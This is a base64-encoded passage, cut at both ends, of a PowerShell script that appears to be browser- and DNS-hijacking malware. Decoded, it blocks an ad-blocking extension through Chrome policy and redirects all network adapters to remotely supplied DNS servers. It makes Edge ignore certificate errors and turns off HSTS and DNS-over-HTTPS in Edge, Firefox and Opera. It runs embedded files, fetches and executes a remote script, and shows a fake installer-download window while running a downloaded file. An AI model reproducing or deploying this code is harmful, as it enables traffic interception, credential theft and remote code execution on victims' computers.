ICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBvY2N1cnJlZDogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZm9sZGVyDQogICAgKQ0KDQogICAgJHJlc3VsdCA9ICIiDQoNCiAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRmb2xkZXIgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgIGlmICgtbm90ICgkXy5QU0lzQ29udGFpbmVyKSkgew0KICAgICAgICAgICAgaWYgKCRfLk5hbWUgLWVxICJtYW5pZmVzdC5qc29uIikgew0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2VpZiAoJF8uTmFtZSAtbm90aW4gQCgnLicsICcuLicpKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgLWZvbGRlciAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgaWYgKCRyZXN1bHQgLW5lICIiKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3RBbGwgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZXh0TmFtZQ0KICAgICkNCg0KICAgIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3QgLWV4dE5hbWUgJGV4dE5hbWUgLWJyb3dzZXIgIkdvb2dsZVxDaHJvbWUiDQp9DQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3Qgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZXh0TmFtZSwNCiAgICAgICAgW3N0cmluZ10kYnJvd3Nlcg0KICAgICkNCg0KICAgICRyZWdQYXRoID0gIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXCRicm93c2VyXEV4dGVuc2lvbkluc3RhbGxCbG9ja2xpc3QiDQogICAgDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcmVnUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ1BhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQogICAgDQogICAgJHJlZ0tleUluZGV4ID0gMQ0KICAgIGRvIHsNCiAgICAgICAgJGtleU5hbWUgPSAiJHJlZ0tleUluZGV4Ig0KICAgICAgICAkdmFsID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAka2V5TmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBpZiAoJHZhbCAtZXEgJGV4dE5hbWUpIHsNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQogICAgICAgICRyZWdLZXlJbmRleCsrDQogICAgfSB1bnRpbCAoLW5vdCAoVGVzdC1QYXRoICIkcmVnUGF0aFwka2V5TmFtZSIpKQ0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAka2V5TmFtZSAtVmFsdWUgJGV4dE5hbWUNCn0NCg0KZnVuY3Rpb24gU2V0LURuc1NlcnZlcnMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcHJpbWFyeURuc1NlcnZlciwNCiAgICAgICAgW3N0cmluZ10kc2Vjb25kYXJ5RG5zU2VydmVyDQogICAgKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgIyBHZXQgbmV0d29yayBhZGFwdGVycyB0aGF0IGFyZSBJUC1lbmFibGVkDQogICAgICAgICRuZXR3b3JrQWRhcHRlcnMgPSBHZXQtTmV0QWRhcHRlciB8IFdoZXJlLU9iamVjdCB7ICRfLlN0YXR1cyAtZXEgJ1VwJyAtYW5kICRfLkludGVyZmFjZURlc2NyaXB0aW9uIC1ub3RsaWtlICcqVmlydHVhbConIH0NCg0KICAgICAgICBmb3JlYWNoICgkYWRhcHRlciBpbiAkbmV0d29ya0FkYXB0ZXJzKSB7DQogICAgICAgICAgICAjIFNldCBETlMgc2VydmVycyB1c2luZyBTZXQtRG5zQ2xpZW50U2VydmVyQWRkcmVzcyBjbWRsZXQNCiAgICAgICAgICAgIFNldC1EbnNDbGllbnRTZXJ2ZXJBZGRyZXNzIC1JbnRlcmZhY2VBbGlhcyAkYWRhcHRlci5OYW1lIC1TZXJ2ZXJBZGRyZXNzZXMgQCgkcHJpbWFyeURuc1NlcnZlciwgJHNlY29uZGFyeURuc1NlcnZlcikgLUNvbmZpcm06JGZhbHNlDQogICAgICAgICAgICANCiAgICAgICAgICAgIHdyaXRlZGJnICJTdWNjZXNzZnVsbHkgc2V0IEROUyBzZXJ2ZXJzIGZvciBhZGFwdGVyOiAkKCRhZGFwdGVyLkludGVyZmFjZURlc2NyaXB0aW9uKSINCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fZG5zbWFuIHsNCiAgICBTZXQtRE5TU2VydmVycyAtUHJpbWFyeUROU1NlcnZlciAkc2VydmVyLnByaW1hcnlEbnMgLVNlY29uZGFyeUROU1NlcnZlciAkc2VydmVyLnNlY29uZGFyeURucw0KfQ0KDQpmdW5jdGlvbiBkb19lZGdlIHsNCiAgICAkcGF0aHMgPSBAKA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XEVkZ2UiLA0KICAgICAgICAiSEtDVTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XEVkZ2UiDQogICAgKQ0KDQogICAgZm9yZWFjaCAoJGVkZ2VLZXlQYXRoIGluICRwYXRocykgDQogICAgew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRlZGdlS2V5UGF0aCkpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRlZGdlS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkY29tbWFuZExpbmVQYXRoID0gSm9pbi1QYXRoICRlZGdlS2V5UGF0aCAiQ29tbWFuZExpbmUiDQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNvbW1hbmRMaW5lUGF0aCkpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRjb21tYW5kTGluZVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY29tbWFuZExpbmVQYXRoIC1OYW1lICIoRGVmYXVsdCkiIC1WYWx1ZSAiLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzIC0tZGlzYWJsZS1xdWljIC0tZGlzYWJsZS1oc3RzIg0KICAgICAgICANCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIklnbm9yZUNlcnRpZmljYXRlRXJyb3JzIiAtVmFsdWUgMQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBFbWJlZGRpbmdOYW1lIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJG5hbWUNCiAgICApDQogICAgJGZvbGRlciA9IEdldC1IZXBoYWVzdHVzRm9sZGVyDQogICAgcmV0dXJuIEpvaW4tUGF0aCAtUGF0aCAkZm9sZGVyIC1DaGlsZFBhdGggJG5hbWUNCn0NCg0KZnVuY3Rpb24gRG9JbnRlcm5hbEVtYmVkZGluZ3Mgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2FycmF5XSRuYW1lcywgW2FycmF5XSRkYXRhcywgJGZvcmNlLCAkbmFtZQ0KICAgICkNCg0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRmb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIGZ1bmN0aW9uIERvSW50ZXJuYWxFbWJlZGRpbmdzICgkbmFtZSkiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkgDQogICAgew0KICAgICAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRuYW1lcy5MZW5ndGg7ICRpKyspIHsNCiAgICAgICAgICAgICRuYW1lID0gJG5hbWVzWyRpXQ0KICAgICAgICAgICAgJGRhdGEgPSAkZGF0YXNbJGldDQogICAgICAgICAgICAkZmlsZSA9IEVtYmVkZGluZ05hbWUoJG5hbWUpDQogICAgICAgICAgICBFeHRyYWN0RW1iZWRkaW5nIC1pbkNvbnRlbnQgJGRhdGEgLW91dEZpbGUgJGZpbGUNCiAgICAgICAgICAgIEludm9rZS1JdGVtICRmaWxlDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoRG9Gcm9udCk6ICRfIg0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBEb0Zyb250IHsNCiAgICBEb0ludGVybmFsRW1iZWRkaW5ncyAtbmFtZXMgJHhmcm9udF9uYW1lIC1kYXRhcyAkeGZyb250IC1mb3JjZSAkc2VydmVyLmZyb250Rm9yY2UgLW5hbWUgImZyb250Ig0KfQ0KDQpmdW5jdGlvbiBEb0VtYmVkZGluZ3Mgew0KICAgIERvSW50ZXJuYWxFbWJlZGRpbmdzIC1uYW1lcyAkeGVtYmVkX25hbWUgLWRhdGFzICR4ZW1iZWQgLWZvcmNlICRzZXJ2ZXIuZW1iZWRkaW5nc0ZvcmNlIC1uYW1lICJlbWJlZGRpbmdzIg0KfQ0KDQpmdW5jdGlvbiBkb19lbWJlZGRpbmdzIHsNCiAgICBEb0Zyb250DQogICAgRG9FbWJlZGRpbmdzDQp9DQoNCmZ1bmN0aW9uIGRvX2V4dHJhdXBkYXRlKCkgew0KICAgIGlmICgtbm90ICRzZXJ2ZXIuZXh0cmFVcGRhdGUpew0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcygxKQ0KICAgICRkZWxheSA9IDUNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICANCiAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc2VydmVyLmV4dHJhVXBkYXRlVXJsIC1Vc2VCYXNpY1BhcnNpbmcgLU1ldGhvZCBHZXQNCg0KICAgICAgICAgICAgaWYgKCRyZXNwb25zZS5TdGF0dXNDb2RlIC1lcSAyMDApIHsNCiAgICAgICAgICAgICAgICAkc2NyaXB0QmxvY2sgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJHJlc3BvbnNlLkNvbnRlbnQpDQogICAgICAgICAgICAgICAgLiAkc2NyaXB0QmxvY2sNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIGRvd25sb2FkIG9yIGV4ZWN1dGUgdGhlIHNjcmlwdDogJF8iDQogICAgICAgIH0NCg0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICB9DQogICAgd3JpdGVkYmcgIkZhaWxlZCB0byBkb3dubG9hZCB0aGUgc2NyaXB0IHdpdGhpbiB0aGUgYWxsb3R0ZWQgdGltZS4iDQp9DQoNCmZ1bmN0aW9uIGRvX2ZpcmVmb3ggDQp7DQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgU2V0LUZpcmVmb3hSZWdpc3RyeSAtS2V5UGF0aHMgQCgNCiAgICAgICAgICAgICdTT0ZUV0FSRVxQb2xpY2llc1xNb3ppbGxhXEZpcmVmb3hcRE5TT3ZlckhUVFBTJywNCiAgICAgICAgICAgICdTT0ZUV0FSRVxQb2xpY2llc1xNb3ppbGxhXEZpcmVmb3hcRE5TT3ZlckhUVFBTJw0KICAgICAgICApIC1WYWx1ZU5hbWVzIEAoJ0VuYWJsZWQnLCAnTG9ja2VkJykgLVZhbHVlcyBAKDAsIDEpDQogICAgfQ0KICAgIGNhdGNoIA0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIkZhaWxlZCB0byBzZXQgZmlyZWZveCByZWdpc3RyeTogJF8iDQogICAgfQ0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSANCiAgICB7DQogICAgICAgIHRyeSANCiAgICAgICAgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIk1vemlsbGFcRmlyZWZveFxQcm9maWxlc1x1c2VyLmpzIg0KDQogICAgICAgICAgICAkVXNlckpTQ29udGVudCA9ICd1c2VyX3ByZWYoIm5ldHdvcmsudHJyLm1vZGUiLCA1KTsnDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRwYXRoIC1JdGVtVHlwZSBGaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJHBhdGggLVZhbHVlICRVc2VySlNDb250ZW50IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggDQogICAgICAgIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gd3JpdGUgdG8gdXNlci5qcyBmaWxlOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBTZXQtRmlyZWZveFJlZ2lzdHJ5IHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kS2V5UGF0aHMsDQogICAgICAgIFtzdHJpbmdbXV0kVmFsdWVOYW1lcywNCiAgICAgICAgW2ludFtdXSRWYWx1ZXMNCiAgICApDQoNCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgJHJlZ0tleSA9IFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnldOjpMb2NhbE1hY2hpbmUNCg0KICAgIHRyeSB7DQogICAgICAgIGZvcmVhY2ggKCRpIGluIDAuLigkS2V5UGF0aHMuTGVuZ3RoIC0gMSkpIHsNCiAgICAgICAgICAgICRrZXkgPSAkcmVnS2V5Lk9wZW5TdWJLZXkoJEtleVBhdGhzWyRpXSwgJHRydWUpDQogICAgICAgICAgICBpZiAoJGtleSAtZXEgJG51bGwpIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIG9wZW4gcmVnaXN0cnkga2V5OiAkKCRLZXlQYXRoc1skaV0pIg0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAka2V5LlNldFZhbHVlKCRWYWx1ZU5hbWVzWyRpXSwgJFZhbHVlc1skaV0sIFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlWYWx1ZUtpbmRdOjpEV29yZCkNCiAgICAgICAgICAgICRrZXkuQ2xvc2UoKQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkVycm9yIGFjY2Vzc2luZyBvciBtb2RpZnlpbmcgcmVnaXN0cnk6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fb3BlcmENCnsNCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnb3BlcmFfY3Jhc2hyZXBvcnRlci5leGUnLCAnb3BlcmEuZXhlJykpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggJ09wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZScNCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWd1cmVPcGVyYUludGVybmFsIC1GaWxlUGF0aCAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBvY2N1cnJlZCBpbiBPcGVyYTogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZU9wZXJhSW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCg0KICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoJG51bGwgLWVxICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1vciAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtaXNub3QgW29iamVjdF0pIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgPSBAew0KICAgICAgICAgICAgJ21vZGUnID0gJ29mZicNCiAgICAgICAgICAgICdvcGVyYScgPSBAew0KICAgICAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJ3RlbXBsYXRlcycgPSAiIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMubW9kZSA9ICdvZmYnDQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm9wZXJhID0gQHsNCiAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICB9DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLnRlbXBsYXRlcyA9ICIiDQogICAgfQ0KDQogICAgJGpzb25TdHJpbmcgPSAkY29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1WYWx1ZSAkanNvblN0cmluZyAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCg0KICAgIHdyaXRlZGJnICJTdWNjZXNzZnVsbHkgY29uZmlndXJlZCBPcGVyYSBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQoNCmZ1bmN0aW9uIEdldC1GaWxlTmFtZUZyb21Vcmkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJpDQogICAgKQ0KDQogICAgIyBDcmVhdGUgYSBVcmkgb2JqZWN0DQogICAgJHVyaU9iamVjdCA9IFtTeXN0ZW0uVXJpXTo6bmV3KCR1cmkpDQoNCiAgICAjIEV4dHJhY3QgdGhlIGZpbGUgbmFtZSBmcm9tIHRoZSBwYXRoIG9mIHRoZSBVUkkNCiAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkdXJpT2JqZWN0LkFic29sdXRlUGF0aCkNCg0KICAgIHJldHVybiAkZmlsZU5hbWUNCn0NCg0KZnVuY3Rpb24gQWRkLVJhbmRvbURpZ2l0c1RvRmlsZW5hbWUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZmlsZU5hbWUNCiAgICApDQoNCiAgICAjIFNwbGl0IGZpbGVuYW1lIGludG8gYmFzZSBhbmQgZXh0ZW5zaW9uDQogICAgJGJhc2VOYW1lID0gJGZpbGVOYW1lIC1yZXBsYWNlICdcLlteLl0rJCcsICcnDQogICAgJGV4dGVuc2lvbiA9ICRmaWxlTmFtZSAtcmVwbGFjZSAnLipcLicsICcuJw0KDQogICAgIyBHZW5lcmF0ZSBhIHJhbmRvbSBudW1iZXIgYmV0d2VlbiAxMDAwIGFuZCA5OTk5DQogICAgJHJhbmRvbU51bWJlciA9IEdldC1SYW5kb20gLU1pbmltdW0gMTAwMCAtTWF4aW11bSA5OTk5DQoNCiAgICAjIENvbWJpbmUgYmFzZSBuYW1lLCByYW5kb20gbnVtYmVyLCBhbmQgZXh0ZW5zaW9uDQogICAgJG5ld0ZpbGVOYW1lID0gIiRiYXNlTmFtZSIgKyAiXyRyYW5kb21OdW1iZXIkZXh0ZW5zaW9uIg0KDQogICAgcmV0dXJuICRuZXdGaWxlTmFtZQ0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Eb3dubG9hZEFuZEV4ZWN1dGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLA0KICAgICAgICBbc3RyaW5nXSR0aXRsZQ0KICAgICkNCg0KICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBmb3JtDQogICAgJGZvcm0gPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm0NCiAgICAkZm9ybS5UZXh0ID0gJHRpdGxlDQogICAgJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0MDAsIDIwMCkNCiAgICAkZm9ybS5TdGFydFBvc2l0aW9uID0gIkNlbnRlclNjcmVlbiINCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIHByb2dyZXNzIGJhcg0KICAgICRwcm9ncmVzc0JhciA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuUHJvZ3Jlc3NCYXINCiAgICAkcHJvZ3Jlc3NCYXIuTWluaW11bSA9IDANCiAgICAkcHJvZ3Jlc3NCYXIuTWF4aW11bSA9IDEwMA0KICAgICRwcm9ncmVzc0Jhci5TdGVwID0gMQ0KICAgICRwcm9ncmVzc0Jhci5WYWx1ZSA9IDANCiAgICAkcHJvZ3Jlc3NCYXIuV2lkdGggPSAzNTANCiAgICAkcHJvZ3Jlc3NCYXIuSGVpZ2h0ID0gMzANCiAgICAkcHJvZ3Jlc3NCYXIuVG9wID0gODANCiAgICAkcHJvZ3Jlc3NCYXIuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRwcm9ncmVzc0JhcikNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIHN0YXR1cyBsYWJlbA0KICAgICRzdGF0dXNMYWJlbCA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuTGFiZWwNCiAgICAkc3RhdHVzTGFiZWwuVGV4dCA9ICJEb3dubG9hZGluZy4uLiINCiAgICAkc3RhdHVzTGFiZWwuQXV0b1NpemUgPSAkdHJ1ZQ0KICAgICRzdGF0dXNMYWJlbC5Ub3AgPSA1MA0KICAgICRzdGF0dXNMYWJlbC5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHN0YXR1c0xhYmVsKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgZGVzY3JpcHRpb24gbGFiZWwNCiAgICAkZGVzY3JpcHRpb25MYWJlbCA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuTGFiZWwNCiAgICAkZGVzY3JpcHRpb25MYWJlbC5UZXh0ID0gIlRoZSBpbnN0YWxsZXIgaXMgY3VycmVudGx5IGJlaW5nIGRvd25sb2FkZWQuIFBsZWFzZSB3YWl0IHVudGlsIHRoZSBwcm9jZXNzIGNvbXBsZXRlcy4iDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuQXV0b1NpemUgPSAkdHJ1ZQ0KICAgICRkZXNjcmlwdGlvbkxhYmVsLldpZHRoID0gMzUwDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuVG9wID0gMTANCiAgICAkZGVzY3JpcHRpb25MYWJlbC5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJGRlc2NyaXB0aW9uTGFiZWwpDQoNCiAgICAjIFNob3cgdGhlIGZvcm0gbm9uLW1vZGFsbHkNCiAgICAkZm9ybS5TaG93KCkNCg0KICAgICMgRGV0ZXJtaW5lIHRoZSBmaWxlIG5hbWUgYW5kIHBhdGgNCiAgICAkZmlsZU5hbWUgPSBHZXQtRmlsZU5hbWVGcm9tVXJpIC11cmkgJHVybA0KICAgICRmaWxlTmFtZVNhdmUgPSBBZGQtUmFuZG9tRGlnaXRzVG9GaWxlbmFtZSAtZmlsZU5hbWUgJGZpbGVOYW1lDQoNCiAgICAkdGVtcERpciA9IChTcGxpdC1QYXRoIC1QYXRoICRQU0NvbW1hbmRQYXRoKQ0KICAgICRpbnN0YWxsZXJQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkdGVtcERpciwgJGZpbGVOYW1lU2F2ZSkNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIFdlYkNsaWVudA0KICAgICR3ZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50DQoNCiAgICAjIERlZmluZSBldmVudCBoYW5kbGVycw0KICAgICRwcm9ncmVzc0NoYW5nZWRIYW5kbGVyID0gW1N5c3RlbS5OZXQuRG93bmxvYWRQcm9ncmVzc0NoYW5nZWRFdmVudEhhbmRsZXJdew0KICAgICAgICBwYXJhbSAoJHNlbmRlciwgJGV2ZW50QXJncykNCiAgICAgICAgJHByb2dyZXNzQmFyLlZhbHVlID0gJGV2ZW50QXJncy5Qcm9ncmVzc1BlcmNlbnRhZ2UNCiAgICAgICAgJGZvcm0uUmVmcmVzaCgpDQogICAgfQ0KDQogICAgJGRvd25sb2FkRmlsZUNvbXBsZXRlZEhhbmRsZXIgPSBbU3lzdGVtLkNvbXBvbmVudE1vZGVsLkFzeW5jQ29tcGxldGVkRXZlbnRIYW5kbGVyXXsNCiAgICAgICAgcGFyYW0gKCRzZW5kZXIsICRldmVudEFyZ3MpDQogICAgICAgICMgQ2xvc2UgdGhlIGZvcm0gYmVmb3JlIHN0YXJ0aW5nIHRoZSBpbnN0YWxsZXINCiAgICAgICAgJGZvcm0uSW52b2tlKFthY3Rpb25dIHsgDQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgICAgICAgICAkZm9ybS5DbG9zZSgpIA0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgICAgICB9KQ0KICAgICAgICANCiAgICAgICAgaWYgKCRldmVudEFyZ3MuRXJyb3IpIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRXJyb3IgZG93bmxvYWRpbmcgZmlsZTogIiArICRldmVudEFyZ3MuRXJyb3IuTWVzc2FnZSwgIkRvd25sb2FkIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICB9IGVsc2VpZiAoJGV2ZW50QXJncy5DYW5jZWxsZWQpIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRG93bmxvYWQgY2FuY2VsbGVkLiIsICJEb3dubG9hZCBDYW5jZWxsZWQiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6V2FybmluZykNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHRyeSB7DQ